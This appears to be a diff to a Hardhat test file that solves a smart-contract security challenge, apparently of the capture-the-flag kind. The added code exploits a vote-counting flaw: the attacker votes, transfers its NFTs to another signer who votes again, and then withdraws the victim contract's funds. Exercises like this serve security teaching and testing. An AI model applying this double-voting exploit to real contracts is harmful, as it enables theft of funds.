@@ -26,7 +26,13 @@ describe(NAME, function () {
       })
 
       it("conduct your attack here", async function () {
-          
+          const [, ,...signers] = await ethers.getSigners();
+          await victimContract.connect(attackerWallet).nominateChallenger(attackerWallet.address);
+          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address,signers[0].address,0);
+          await victimContract.connect(attackerWallet).vote(attackerWallet.address); // currently attacker hold 1 NFT
+          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address,signers[0].address,1);
+          await victimContract.connect(signers[0]).vote(attackerWallet.address); // currently signer hold 2 NFT, which makes votes[attacker]>votes[incumbent]
+          await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
       });
 
       after(async function () {
